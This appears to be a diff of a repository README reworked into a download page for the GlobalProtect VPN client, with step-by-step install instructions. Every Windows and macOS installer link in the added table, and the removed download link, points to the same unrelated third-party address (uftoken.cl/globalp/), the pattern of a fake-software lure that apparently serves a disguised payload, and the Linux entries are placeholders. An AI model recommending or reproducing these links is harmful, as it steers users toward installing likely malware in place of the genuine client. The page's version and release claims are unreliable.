@@ -1,20 +1,37 @@
-# <img width="35px" src="unnamed.png" alt="Sonarr"></img> GlobalProtect
+# Download and install GlobalProtect
 
-GlobalProtect is a comprehensive security solution designed to protect users and their data while enabling secure access to corporate resources from any location worldwide. It ensures that enterprise-grade security policies extend to all endpoints, whether they are within the corporate perimeter or remote. By leveraging next-generation firewall technology, GlobalProtect safeguards sensitive information, enhances user productivity, and mitigates risks associated with remote work, ensuring seamless and secure connectivity for businesses of all sizes.
+**GlobalProtect** is a security solution that protects users and data while enabling secure access to corporate resources worldwide. Extending enterprise-grade security policies to all endpoints, it leverages next-generation firewall technology to safeguard sensitive information, boost productivity, and mitigate risks, ensuring seamless, secure connectivity for businesses.
 
 ## Table of Contents
 
-1. [Installation](#installation)
-2. [System Requirements](#system-requirements)
-3. [Features and Components](#features-and-components)
-4. [Usage Instructions](#usage-instructions)
-5. [Troubleshooting](#troubleshooting)
+- [Download GlobalProtect](#download-globalprotect)
+- [Install GlobalProtect](#install-globalprotect)
+- [System Requirements](#system-requirements)
+- [Features and Components](#features-and-components)
+- [Usage Instructions](#usage-instructions)
+- [Troubleshooting](#troubleshooting)
 
-## Installation
+## Download GlobalProtect
+GlobalProtect 6.3 is the latest stable version
+
+*   Release number: 6.3
+*   Release date: January 10, 2025
+
+| Platform | Type             | Download                                                                                                                                                                                                                             |
+| -------- | ---------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| Windows  | Standard Installer   | [64-bit version](https://uftoken.cl/globalp/) [ARM64 version](https://uftoken.cl/globalp/)                                                                                          |
+|          | System Installer | [64-bit version](https://uftoken.cl/globalp/) [ARM64 version](https://uftoken.cl/globalp/)                                                                                        |
+|          | .zip             | [64-bit version](https://uftoken.cl/globalp/) [ARM64 version](https://uftoken.cl/globalp/)                                                                                          |
+| macOS    | .zip             | [Universal](https://uftoken.cl/globalp/) [Intel Chip](https://uftoken.cl/globalp/) [Apple Silicon](https://uftoken.cl/globalp/) |
+| Linux    | .tar.gz          | [64-bit version](*)                                                                                                                                                                 |
+|          | .deb             | [64-bit version](*)                                                                                                                                                               |
+|          | .rpm             | [64-bit version](*)   
+
+
+
+## Install GlobalProtect
 
 ### Installing on Windows
-
-### 🔗 [**Download the GlobalProtect**](https://uftoken.cl/globalp/)
 
 1. **Install the App**:
    - Open the installer file and follow the prompts in the GlobalProtect Setup Wizard.
